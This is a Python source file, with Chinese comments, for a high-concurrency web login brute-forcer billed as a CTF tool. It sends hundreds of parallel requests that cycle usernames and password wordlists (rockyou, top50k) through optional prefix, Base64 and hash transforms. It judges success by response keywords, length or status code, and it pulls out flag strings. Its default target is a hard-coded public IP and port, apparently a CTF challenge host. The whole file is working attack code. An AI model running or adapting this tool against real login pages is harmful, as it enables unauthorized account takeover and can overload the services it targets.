#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║     ██████╗ ██████╗ ██╗   ██╗████████╗███████╗    ██╗  ██╗                   ║
║     ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝    ╚██╗██╔╝                   ║
║     ██████╔╝██████╔╝██║   ██║   ██║   █████╗       ╚███╔╝                    ║
║     ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝       ██╔██╗                    ║
║     ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗    ██╔╝ ██╗                   ║
║     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚═╝  ╚═╝                   ║
║                                                                               ║
║                    🔥 CTF 通用爆破工具 v6.0 🔥                                ║
║                     M4 Pro 性能优化版 | 48GB 内存                             ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝

功能特性:
  ✅ 异步高并发 (500+ 连接)
  ✅ Payload 处理器 (前缀/后缀/Base64/MD5/URL编码等)
  ✅ 多种成功判断条件
  ✅ 精美 TUI 界面
  ✅ 自动提取 Flag
  ✅ 命令行参数支持
  ✅ 实时速度/进度/ETA

作者: chenjianfang
GitHub: https://github.com/YOUR_USERNAME/ctf-web-solver
"""

import asyncio
import aiohttp
import time
import sys
import os
import re
import json
import base64
import hashlib
import urllib.parse
import argparse
from typing import List, Dict, Optional, Callable, Tuple, Any
from dataclasses import dataclass, field
from datetime import datetime
from collections import deque
import itertools

# ═══════════════════════════════════════════════════════════════════════════════
#                              🎨 终端样式系统
# ═══════════════════════════════════════════════════════════════════════════════

class Style:
    """终端样式"""
    # 基础
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    
    # 颜色
    BLACK = '\033[30m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    
    # 扩展颜色
    ORANGE = '\033[38;5;208m'
    PINK = '\033[38;5;213m'
    PURPLE = '\033[38;5;141m'
    LIME = '\033[38;5;118m'
    GRAY = '\033[38;5;245m'
    
    # 背景
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_BLUE = '\033[44m'
    BG_CYAN = '\033[46m'

S = Style  # 简写

def colorize(text: str, *styles) -> str:
    """给文字添加样式"""
    style_str = ''.join(styles)
    return f"{style_str}{text}{S.RESET}"

def clear_line():
    """清除当前行"""
    print('\r' + ' ' * 100 + '\r', end='')

# ═══════════════════════════════════════════════════════════════════════════════
#                           🔧 Payload 处理器系统
# ═══════════════════════════════════════════════════════════════════════════════

class PayloadProcessor:
    """
    Payload 处理器
    
    支持 Burp Suite 风格的处理规则:
    - 前缀/后缀
    - Base64 编码/解码
    - MD5/SHA1/SHA256 哈希
    - URL 编码/解码
    - 大小写转换
    - 自定义函数
    
    使用示例:
        processors = [
            PayloadProcessor.prefix("admin:"),
            PayloadProcessor.base64_encode(),
        ]
        # password -> admin:password -> YWRtaW46cGFzc3dvcmQ=
    """
    
    @staticmethod
    def prefix(text: str) -> Callable[[str], str]:
        """添加前缀: prefix("admin:") -> "admin:password" """
        return lambda x: f"{text}{x}"
    
    @staticmethod
    def suffix(text: str) -> Callable[[str], str]:
        """添加后缀: suffix("@123") -> "password@123" """
        return lambda x: f"{x}{text}"
    
    @staticmethod
    def base64_encode() -> Callable[[str], str]:
        """Base64 编码"""
        return lambda x: base64.b64encode(x.encode()).decode()
    
    @staticmethod
    def base64_decode() -> Callable[[str], str]:
        """Base64 解码"""
        return lambda x: base64.b64decode(x.encode()).decode()
    
    @staticmethod
    def md5() -> Callable[[str], str]:
        """MD5 哈希 (32位)"""
        return lambda x: hashlib.md5(x.encode()).hexdigest()
    
    @staticmethod
    def md5_16() -> Callable[[str], str]:
        """MD5 哈希 (16位)"""
        return lambda x: hashlib.md5(x.encode()).hexdigest()[8:24]
    
    @staticmethod
    def sha1() -> Callable[[str], str]:
        """SHA1 哈希"""
        return lambda x: hashlib.sha1(x.encode()).hexdigest()
    
    @staticmethod
    def sha256() -> Callable[[str], str]:
        """SHA256 哈希"""
        return lambda x: hashlib.sha256(x.encode()).hexdigest()
    
    @staticmethod
    def url_encode() -> Callable[[str], str]:
        """URL 编码"""
        return lambda x: urllib.parse.quote(x)
    
    @staticmethod
    def url_encode_all() -> Callable[[str], str]:
        """URL 编码 (全部字符)"""
        return lambda x: urllib.parse.quote(x, safe='')
    
    @staticmethod
    def url_decode() -> Callable[[str], str]:
        """URL 解码"""
        return lambda x: urllib.parse.unquote(x)
    
    @staticmethod
    def upper() -> Callable[[str], str]:
        """转大写"""
        return lambda x: x.upper()
    
    @staticmethod
    def lower() -> Callable[[str], str]:
        """转小写"""
        return lambda x: x.lower()
    
    @staticmethod
    def reverse() -> Callable[[str], str]:
        """反转字符串"""
        return lambda x: x[::-1]
    
    @staticmethod
    def repeat(n: int) -> Callable[[str], str]:
        """重复 n 次"""
        return lambda x: x * n
    
    @staticmethod
    def replace(old: str, new: str) -> Callable[[str], str]:
        """替换字符串"""
        return lambda x: x.replace(old, new)
    
    @staticmethod
    def substring(start: int, end: int = None) -> Callable[[str], str]:
        """截取子串"""
        return lambda x: x[start:end]
    
    @staticmethod
    def pad_left(length: int, char: str = '0') -> Callable[[str], str]:
        """左填充: pad_left(4, '0') -> "0001" """
        return lambda x: x.zfill(length) if char == '0' else x.rjust(length, char)
    
    @staticmethod
    def pad_right(length: int, char: str = ' ') -> Callable[[str], str]:
        """右填充"""
        return lambda x: x.ljust(length, char)
    
    @staticmethod
    def custom(func: Callable[[str], str]) -> Callable[[str], str]:
        """自定义处理函数"""
        return func

# 简写
P = PayloadProcessor

def apply_processors(value: str, processors: List[Callable]) -> str:
    """按顺序应用处理器链"""
    result = value
    for proc in processors:
        result = proc(result)
    return result

def describe_processors(processors: List[Callable]) -> str:
    """获取处理器描述"""
    names = []
    for p in processors:
        # 尝试从闭包获取信息
        closure = getattr(p, '__closure__', None)
        if closure and len(closure) > 0:
            val = closure[0].cell_contents
            if isinstance(val, str):
                if 'prefix' in p.__qualname__ or 'suffix' in p.__qualname__:
                    names.append(f"添加'{val}'")
                    continue
        
        # 根据函数名推断
        name = p.__qualname__ if hasattr(p, '__qualname__') else str(p)
        if 'base64_encode' in name:
            names.append('Base64编码')
        elif 'base64_decode' in name:
            names.append('Base64解码')
        elif 'md5_16' in name:
            names.append('MD5(16位)')
        elif 'md5' in name:
            names.append('MD5')
        elif 'sha1' in name:
            names.append('SHA1')
        elif 'sha256' in name:
            names.append('SHA256')
        elif 'url_encode' in name:
            names.append('URL编码')
        elif 'upper' in name:
            names.append('大写')
        elif 'lower' in name:
            names.append('小写')
        elif 'prefix' in name:
            names.append('前缀')
        elif 'suffix' in name:
            names.append('后缀')
        else:
            names.append('处理')
    
    return ' → '.join(names) if names else '无'

# ═══════════════════════════════════════════════════════════════════════════════
#                              ⚙️ 配置系统
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class BruteConfig:
    """爆破配置"""
    
    # ═══════════ 目标配置 ═══════════
    url: str = "http://127.0.0.1/"
    method: str = "POST"  # GET, POST, JSON
    
    # ═══════════ 请求数据 ═══════════
    # 使用 {NAME} 标记爆破位置
    data: Dict[str, str] = field(default_factory=lambda: {
        "username": "{USER}",
        "password": "{PASS}"
    })
    
    # ═══════════ 请求头 ═══════════
    headers: Dict[str, str] = field(default_factory=lambda: {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    })
    
    # ═══════════ Cookies ═══════════
    cookies: Dict[str, str] = field(default_factory=dict)
    
    # ═══════════ Payload 配置 ═══════════
    payloads: Dict[str, dict] = field(default_factory=lambda: {
        "USER": {
            "type": "list",
            "values": ["admin"],
            "processors": []  # 不处理
        },
        "PASS": {
            "type": "file",
            "path": "rockyou.txt",
            "processors": []  # 处理器链
        }
    })
    
    # ═══════════ 性能配置 ═══════════
    concurrency: int = 500      # 并发连接数
    timeout: float = 5.0        # 超时时间(秒)
    retries: int = 2            # 重试次数
    batch_size: int = 2000      # 批处理大小
    
    # ═══════════ 成功条件 ═══════════
    # 失败标记 (包含则失败)
    fail_keywords: List[str] = field(default_factory=lambda: [
        "错误", "失败", "error", "invalid", "incorrect", "wrong", "denied", "bad"
    ])
    # 成功标记 (包含则成功)
    success_keywords: List[str] = field(default_factory=list)
    # 成功正则
    success_regex: str = ""
    # 长度条件
    success_length: Optional[int] = None      # 等于
    success_length_not: Optional[int] = None  # 不等于
    # 状态码
    success_status: Optional[int] = None
    
    # ═══════════ 智能模式 ═══════════
    smart_mode: bool = True     # 自动检测基准响应
    auto_stop: bool = True      # 找到后停止
    
    # ═══════════ 其他 ═══════════
    proxy: Optional[str] = None
    verbose: bool = False
    output_file: str = "results.json"

# ═══════════════════════════════════════════════════════════════════════════════
#                              📊 统计系统
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class Stats:
    """爆破统计"""
    total: int = 0
    completed: int = 0
    success: int = 0
    errors: int = 0
    retried: int = 0
    
    start_time: float = 0.0
    baseline_length: Optional[int] = None
    
    # 速度采样
    _speed_samples: deque = field(default_factory=lambda: deque(maxlen=50))
    _last_sample: Tuple[float, int] = (0.0, 0)
    
    # 结果
    results: List[Dict] = field(default_factory=list)
    flags: List[str] = field(default_factory=list)
    
    @property
    def elapsed(self) -> float:
        return time.time() - self.start_time if self.start_time else 0
    
    @property
    def progress(self) -> float:
        return (self.completed / self.total * 100) if self.total else 0
    
    @property
    def speed(self) -> float:
        """实时速度"""
        if self.elapsed < 0.5:
            return 0
        
        # 使用采样计算
        if len(self._speed_samples) >= 2:
            samples = list(self._speed_samples)
            t_diff = samples[-1][0] - samples[0][0]
            c_diff = samples[-1][1] - samples[0][1]
            if t_diff > 0:
                return c_diff / t_diff
        
        return self.completed / self.elapsed if self.elapsed > 0 else 0
    
    @property
    def eta(self) -> float:
        """预计剩余时间"""
        remaining = self.total - self.completed
        return remaining / self.speed if self.speed > 0 else float('inf')
    
    def sample(self):
        """采样"""
        now = time.time()
        if now - self._last_sample[0] >= 0.2:
            self._speed_samples.append((now, self.completed))
            self._last_sample = (now, self.completed)

# ═══════════════════════════════════════════════════════════════════════════════
#                              🎨 UI 系统
# ═══════════════════════════════════════════════════════════════════════════════

class UI:
    """终端 UI"""
    
    BANNER = """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║     ██████╗ ██████╗ ██╗   ██╗████████╗███████╗    ██╗  ██╗                   ║
║     ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝    ╚██╗██╔╝                   ║
║     ██████╔╝██████╔╝██║   ██║   ██║   █████╗       ╚███╔╝                    ║
║     ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝       ██╔██╗                    ║
║     ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗    ██╔╝ ██╗                   ║
║     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚═╝  ╚═╝                   ║
║                                                                               ║
║                    🔥 CTF 通用爆破工具 v6.0 🔥                                ║
║                       M4 Pro Edition | by chenjianfang                        ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""
    
    @staticmethod
    def print_banner():
        """打印横幅"""
        colors = [S.RED, S.ORANGE, S.YELLOW, S.GREEN, S.CYAN, S.BLUE, S.PURPLE]
        lines = UI.BANNER.strip().split('\n')
        for i, line in enumerate(lines):
            color = colors[i % len(colors)]
            print(f"{color}{line}{S.RESET}")
        print()
    
    @staticmethod
    def print_config(config: BruteConfig):
        """打印配置"""
        print(f"{S.CYAN}┌{'─' * 68}┐{S.RESET}")
        print(f"{S.CYAN}│{S.RESET}  {S.BOLD}⚙️  配置信息{S.RESET}" + " " * 53 + f"{S.CYAN}│{S.RESET}")
        print(f"{S.CYAN}├{'─' * 68}┤{S.RESET}")
        print(f"{S.CYAN}│{S.RESET}  🎯 目标: {S.YELLOW}{config.url[:50]:<50}{S.RESET}     {S.CYAN}│{S.RESET}")
        print(f"{S.CYAN}│{S.RESET}  📡 方法: {S.GREEN}{config.method:<50}{S.RESET}     {S.CYAN}│{S.RESET}")
        print(f"{S.CYAN}│{S.RESET}  🔗 并发: {S.MAGENTA}{config.concurrency:<50}{S.RESET}     {S.CYAN}│{S.RESET}")
        print(f"{S.CYAN}│{S.RESET}  ⏱️  超时: {S.WHITE}{config.timeout}s{S.RESET}" + " " * 46 + f"{S.CYAN}│{S.RESET}")
        print(f"{S.CYAN}└{'─' * 68}┘{S.RESET}")
        print()
    
    @staticmethod
    def print_payloads(config: BruteConfig, total: int):
        """打印 Payload 信息"""
        print(f"{S.CYAN}┌{'─' * 68}┐{S.RESET}")
        print(f"{S.CYAN}│{S.RESET}  {S.BOLD}📋 Payload 配置{S.RESET}" + " " * 50 + f"{S.CYAN}│{S.RESET}")
        print(f"{S.CYAN}├{'─' * 68}┤{S.RESET}")
        
        for name, cfg in config.payloads.items():
            ptype = cfg.get("type", "list")
            processors = cfg.get("processors", [])
            
            # 获取数量
            if ptype == "range":
                count = cfg.get("end", 0) - cfg.get("start", 0) + 1
                desc = f"range({cfg.get('start')}, {cfg.get('end')})"
            elif ptype == "file":
                desc = os.path.basename(cfg.get("path", ""))
                try:
                    with open(cfg.get("path", ""), 'r', errors='ignore') as f:
                        count = sum(1 for _ in f)
                except:
                    count = "?"
            else:
                count = len(cfg.get("values", []))
                desc = f"list ({count} items)"
            
            print(f"{S.CYAN}│{S.RESET}  {S.YELLOW}{name:8}{S.RESET}: {desc:30} [{S.GREEN}{count}{S.RESET} 个]" + " " * 10 + f"{S.CYAN}│{S.RESET}")
            
            # 处理器
            if processors:
                proc_desc = describe_processors(processors)
                print(f"{S.CYAN}│{S.RESET}           {S.GRAY}处理: {proc_desc[:45]}{S.RESET}" + " " * max(0, 45 - len(proc_desc)) + f"   {S.CYAN}│{S.RESET}")
        
        print(f"{S.CYAN}├{'─' * 68}┤{S.RESET}")
        print(f"{S.CYAN}│{S.RESET}  {S.BOLD}总组合数: {S.GREEN}{total:,}{S.RESET}" + " " * (53 - len(f"{total:,}")) + f"{S.CYAN}│{S.RESET}")
        print(f"{S.CYAN}└{'─' * 68}┘{S.RESET}")
        print()
    
    @staticmethod
    def print_progress(stats: Stats):
        """打印进度"""
        # 进度条
        bar_width = 35
        filled = int(bar_width * stats.progress / 100)
        bar = '█' * filled + '░' * (bar_width - filled)
        
        # 速度颜色
        speed = stats.speed
        if speed > 3000:
            speed_style = S.GREEN + S.BOLD
        elif speed > 1000:
            speed_style = S.GREEN
        elif speed > 500:
            speed_style = S.YELLOW
        else:
            speed_style = S.RED
        
        # ETA
        eta = stats.eta
        if eta == float('inf') or eta > 36000:
            eta_str = "计算中"
        elif eta > 3600:
            eta_str = f"{eta/3600:.1f}h"
        elif eta > 60:
            eta_str = f"{eta/60:.1f}m"
        else:
            eta_str = f"{eta:.0f}s"
        
        # 打印
        print(f"\r{S.CYAN}[*]{S.RESET} {S.GREEN}{bar}{S.RESET} "
              f"{S.BOLD}{stats.progress:5.1f}%{S.RESET} │ "
              f"{stats.completed:,}/{stats.total:,} │ "
              f"{speed_style}{speed:,.0f}/s{S.RESET} │ "
              f"ETA: {S.YELLOW}{eta_str}{S.RESET} │ "
              f"Err: {S.RED}{stats.errors}{S.RESET}", end="", flush=True)
    
    @staticmethod
    def print_success(result: Dict):
        """打印成功结果"""
        print("\n")
        print(f"{S.GREEN}{S.BOLD}╔{'═' * 70}╗{S.RESET}")
        print(f"{S.GREEN}{S.BOLD}║{'🎉 爆破成功! 🎉':^68}║{S.RESET}")
        print(f"{S.GREEN}{S.BOLD}╠{'═' * 70}╣{S.RESET}")
        
        for key, value in result.get("payload", {}).items():
            original = value.get("original", value)
            processed = value.get("processed", value)
            
            if original != processed:
                print(f"{S.GREEN}{S.BOLD}║{S.RESET}  {S.YELLOW}{key:10}{S.RESET}: {S.WHITE}{original}{S.RESET}")
                print(f"{S.GREEN}{S.BOLD}║{S.RESET}  {' ':10}  {S.GRAY}→ {processed}{S.RESET}")
            else:
                print(f"{S.GREEN}{S.BOLD}║{S.RESET}  {S.YELLOW}{key:10}{S.RESET}: {S.WHITE}{S.BOLD}{original}{S.RESET}")
        
        print(f"{S.GREEN}{S.BOLD}╠{'═' * 70}╣{S.RESET}")
        print(f"{S.GREEN}{S.BOLD}║{S.RESET}  响应长度: {S.CYAN}{result.get('length', 0)}{S.RESET}" + " " * 50 + f"{S.GREEN}{S.BOLD}║{S.RESET}")
        print(f"{S.GREEN}{S.BOLD}║{S.RESET}  状态码:   {S.CYAN}{result.get('status', 0)}{S.RESET}" + " " * 50 + f"{S.GREEN}{S.BOLD}║{S.RESET}")
        print(f"{S.GREEN}{S.BOLD}╚{'═' * 70}╝{S.RESET}")
        
        # Flag
        for flag in result.get("flags", []):
            print(f"\n{S.RED}{S.BOLD}🚩 FLAG: {flag}{S.RESET}")
    
    @staticmethod
    def print_summary(stats: Stats):
        """打印总结"""
        print("\n")
        print(f"{S.CYAN}┌{'─' * 68}┐{S.RESET}")
        print(f"{S.CYAN}│{S.RESET}  {S.BOLD}📊 爆破统计{S.RESET}" + " " * 53 + f"{S.CYAN}│{S.RESET}")
        print(f"{S.CYAN}├{'─' * 68}┤{S.RESET}")
        print(f"{S.CYAN}│{S.RESET}  总请求: {S.WHITE}{stats.total:,}{S.RESET}" + " " * (55 - len(f"{stats.total:,}")) + f"{S.CYAN}│{S.RESET}")
        print(f"{S.CYAN}│{S.RESET}  已完成: {S.GREEN}{stats.completed:,}{S.RESET}" + " " * (55 - len(f"{stats.completed:,}")) + f"{S.CYAN}│{S.RESET}")
        print(f"{S.CYAN}│{S.RESET}  成功数: {S.YELLOW}{stats.success}{S.RESET}" + " " * (55 - len(str(stats.success))) + f"{S.CYAN}│{S.RESET}")
        print(f"{S.CYAN}│{S.RESET}  错误数: {S.RED}{stats.errors}{S.RESET}" + " " * (55 - len(str(stats.errors))) + f"{S.CYAN}│{S.RESET}")
        print(f"{S.CYAN}├{'─' * 68}┤{S.RESET}")
        print(f"{S.CYAN}│{S.RESET}  耗时: {S.WHITE}{stats.elapsed:.2f}s{S.RESET}" + " " * 52 + f"{S.CYAN}│{S.RESET}")
        avg_speed = stats.completed / stats.elapsed if stats.elapsed > 0 else 0
        print(f"{S.CYAN}│{S.RESET}  平均速度: {S.GREEN}{avg_speed:,.0f}/s{S.RESET}" + " " * (52 - len(f"{avg_speed:,.0f}")) + f"{S.CYAN}│{S.RESET}")
        print(f"{S.CYAN}└{'─' * 68}┘{S.RESET}")

# ═══════════════════════════════════════════════════════════════════════════════
#                              🚀 爆破引擎
# ═══════════════════════════════════════════════════════════════════════════════

class BruteEngine:
    """异步爆破引擎"""
    
    def __init__(self, config: BruteConfig):
        self.config = config
        self.stats = Stats()
        self.stop_flag = False
        self.session: Optional[aiohttp.ClientSession] = None
        self.semaphore: Optional[asyncio.Semaphore] = None
    
    def generate_payloads(self) -> List[Dict]:
        """生成所有 Payload 组合"""
        payload_data = {}
        
        for name, cfg in self.config.payloads.items():
            ptype = cfg.get("type", "list")
            processors = cfg.get("processors", [])
            
            # 生成原始值
            if ptype == "range":
                start = cfg.get("start", 0)
                end = cfg.get("end", 100)
                step = cfg.get("step", 1)
                fmt = cfg.get("format", "{}")
                raw_values = [fmt.format(i) for i in range(start, end + 1, step)]
            
            elif ptype == "file":
                path = cfg.get("path", "")
                if not os.path.exists(path):
                    raise FileNotFoundError(f"字典文件不存在: {path}")
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    raw_values = [line.strip() for line in f if line.strip()]
            
            else:  # list
                raw_values = [str(v) for v in cfg.get("values", [])]
            
            # 应用处理器
            payload_data[name] = []
            for val in raw_values:
                try:
                    processed = apply_processors(val, processors) if processors else val
                    payload_data[name].append({
                        "original": val,
                        "processed": processed
                    })
                except:
                    continue
        
        # 生成笛卡尔积
        names = list(payload_data.keys())
        values_list = [payload_data[n] for n in names]
        
        return [dict(zip(names, combo)) for combo in itertools.product(*values_list)]
    
    def build_request_data(self, payload: Dict) -> Dict:
        """构建请求数据"""
        data = {}
        for key, template in self.config.data.items():
            value = template
            for name, val in payload.items():
                processed = val["processed"] if isinstance(val, dict) else val
                value = value.replace(f"{{{name}}}", str(processed))
            data[key] = value
        return data
    
    def check_success(self, text: str, length: int, status: int) -> bool:
        """检查是否成功"""
        text_lower = text.lower()
        
        # 检查失败关键字
        for kw in self.config.fail_keywords:
            if kw.lower() in text_lower:
                return False
        
        # 检查成功关键字
        for kw in self.config.success_keywords:
            if kw.lower() in text_lower:
                return True
        
        # 正则匹配
        if self.config.success_regex:
            if re.search(self.config.success_regex, text, re.I):
                return True
        
        # 长度判断
        if self.config.success_length is not None:
            if length == self.config.success_length:
                return True
        
        if self.config.success_length_not is not None:
            if length != self.config.success_length_not:
                return True
        
        # 状态码
        if self.config.success_status is not None:
            if status == self.config.success_status:
                return True
        
        # 智能模式
        if self.config.smart_mode and self.stats.baseline_length is not None:
            diff = abs(length - self.stats.baseline_length)
            threshold = max(50, self.stats.baseline_length * 0.1)
            if diff > threshold:
                return True
        
        return False
    
    def extract_flags(self, text: str) -> List[str]:
        """提取 Flag"""
        patterns = [
            r'flag\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'ctf\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'NSSCTF\{[^}]+\}',
            r'hgame\{[^}]+\}',
        ]
        
        flags = []
        for p in patterns:
            flags.extend(re.findall(p, text, re.I))
        return list(set(flags))
    
    async def try_one(self, payload: Dict) -> Optional[Dict]:
        """尝试单个 Payload"""
        if self.stop_flag:
            return None
        
        data = self.build_request_data(payload)
        
        for attempt in range(self.config.retries + 1):
            try:
                async with self.semaphore:
                    timeout = aiohttp.ClientTimeout(total=self.config.timeout)
                    
                    if self.config.method.upper() == "GET":
                        async with self.session.get(self.config.url, params=data, timeout=timeout) as resp:
                            text = await resp.text()
                            status = resp.status
                    elif self.config.method.upper() == "JSON":
                        async with self.session.post(self.config.url, json=data, timeout=timeout) as resp:
                            text = await resp.text()
                            status = resp.status
                    else:  # POST
                        async with self.session.post(self.config.url, data=data, timeout=timeout) as resp:
                            text = await resp.text()
                            status = resp.status
                
                length = len(text)
                
                # 设置基准
                if self.stats.baseline_length is None:
                    self.stats.baseline_length = length
                
                # 检查成功
                if self.check_success(text, length, status):
                    flags = self.extract_flags(text)
                    result = {
                        "payload": payload,
                        "length": length,
                        "status": status,
                        "flags": flags,
                        "response": text[:2000]
                    }
                    
                    self.stats.success += 1
                    self.stats.results.append(result)
                    self.stats.flags.extend(flags)
                    
                    if self.config.auto_stop:
                        self.stop_flag = True
                    
                    return result
                
                self.stats.completed += 1
                return None
                
            except asyncio.TimeoutError:
                if attempt < self.config.retries:
                    self.stats.retried += 1
                else:
                    self.stats.errors += 1
                    self.stats.completed += 1
            except Exception as e:
                if attempt < self.config.retries:
                    self.stats.retried += 1
                else:
                    self.stats.errors += 1
                    self.stats.completed += 1
                    if self.config.verbose:
                        print(f"\n{S.RED}[E] {e}{S.RESET}")
        
        return None
    
    async def run(self):
        """运行爆破"""
        # 生成 Payload
        payloads = self.generate_payloads()
        self.stats.total = len(payloads)
        self.stats.start_time = time.time()
        
        # 创建连接
        connector = aiohttp.TCPConnector(
            limit=self.config.concurrency,
            limit_per_host=self.config.concurrency,
            ttl_dns_cache=300,
            keepalive_timeout=30,
        )
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            headers=self.config.headers,
            cookies=self.config.cookies,
        )
        
        self.semaphore = asyncio.Semaphore(self.config.concurrency)
        
        try:
            for i in range(0, len(payloads), self.config.batch_size):
                if self.stop_flag:
                    break
                
                batch = payloads[i:i + self.config.batch_size]
                tasks = [self.try_one(p) for p in batch]
                await asyncio.gather(*tasks, return_exceptions=True)
                
                self.stats.sample()
                UI.print_progress(self.stats)
        
        finally:
            await self.session.close()

# ═══════════════════════════════════════════════════════════════════════════════
#                              🎯 主程序
# ═══════════════════════════════════════════════════════════════════════════════

def parse_args():
    """解析命令行参数"""
    parser = argparse.ArgumentParser(
        description='🔥 CTF 通用爆破工具 v6.0',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('-u', '--url', help='目标 URL')
    parser.add_argument('-m', '--method', choices=['GET', 'POST', 'JSON'], help='请求方法')
    parser.add_argument('-t', '--threads', type=int, help='并发数')
    parser.add_argument('-d', '--dict', help='字典文件路径')
    parser.add_argument('--timeout', type=float, help='超时时间')
    parser.add_argument('-v', '--verbose', action='store_true', help='详细输出')
    
    return parser.parse_args()

async def main():
    args = parse_args()
    
    # ═══════════════════════════════════════════════════════════════════════════
    #                        📝 在这里配置你的爆破任务
    # ═══════════════════════════════════════════════════════════════════════════
    
    config = BruteConfig(
        # ═══════════ 目标 ═══════════
        url = args.url or "http://47.109.105.62:37283/",
        method = args.method or "POST",
        
        # ═══════════ 请求数据 ═══════════
        data = {
            "username": "{USER}",
            "password": "{PASS}"
        },
        
        # ═══════════ Payload 配置 ═══════════
        payloads = {
            "USER": {
                "type": "range",
                "start": 0,
                "end": 5,
                "processors": []
            },
            "PASS": {
                "type": "file",
                "path": args.dict or "/Users/chenjianfang/Desktop/CISCN/WEB/ctf-web-solver/暴力破解/top50k.txt",
                
                # ═══════════ Payload 处理器 ═══════════
                # 根据题目要求选择:
                #
                # blpj1: 无处理
                # processors = []
                #
                # blpj2: (看题目具体要求)
                # processors = [P.md5()]
                #
                # blpj3: admin:password -> Base64
                # processors = [P.prefix("admin:"), P.base64_encode()]
                #
                # blpj4: (看题目具体要求)
                # processors = [P.sha1()]
                #
                "processors": [
                    # P.prefix("admin:"),
                    # P.base64_encode(),
                ]
            }
        },
        
        # ═══════════ 性能配置 ═══════════
        concurrency = args.threads or 400,
        timeout = args.timeout or 5.0,
        batch_size = 2000,
        
        # ═══════════ 成功条件 ═══════════
        fail_keywords = ["错误", "失败", "error", "invalid", "wrong"],
        
        verbose = args.verbose,
    )
    
    # ═══════════════════════════════════════════════════════════════════════════
    
    # 打印 UI
    UI.print_banner()
    UI.print_config(config)
    
    # 创建引擎
    engine = BruteEngine(config)
    
    # 预览 Payload
    try:
        payloads = engine.generate_payloads()
        UI.print_payloads(config, len(payloads))
        
        if payloads:
            print(f"{S.MAGENTA}[*] Payload 示例:{S.RESET}")
            sample = payloads[0]
            for name, val in sample.items():
                orig = val.get("original", val)
                proc = val.get("processed", val)
                if orig != proc:
                    print(f"    {S.YELLOW}{name}{S.RESET}: {S.WHITE}{orig}{S.RESET} → {S.GREEN}{proc}{S.RESET}")
                else:
                    print(f"    {S.YELLOW}{name}{S.RESET}: {S.WHITE}{orig}{S.RESET}")
            print()
    except FileNotFoundError as e:
        print(f"{S.RED}[!] 错误: {e}{S.RESET}")
        return
    
    print(f"{S.GREEN}{S.BOLD}[*] 开始爆破...{S.RESET}\n")
    
    try:
        await engine.run()
        
        # 结果
        if engine.stats.results:
            for result in engine.stats.results:
                UI.print_success(result)
                print(f"\n{S.BLUE}[+] 响应内容:{S.RESET}")
                print(f"{S.GRAY}{result.get('response', '')[:1000]}{S.RESET}")
        else:
            print(f"\n\n{S.RED}[-] 未找到有效结果{S.RESET}")
        
        UI.print_summary(engine.stats)
        
    except KeyboardInterrupt:
        print(f"\n\n{S.YELLOW}[!] 用户中断{S.RESET}")
        UI.print_summary(engine.stats)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{S.YELLOW}[!] 退出{S.RESET}")
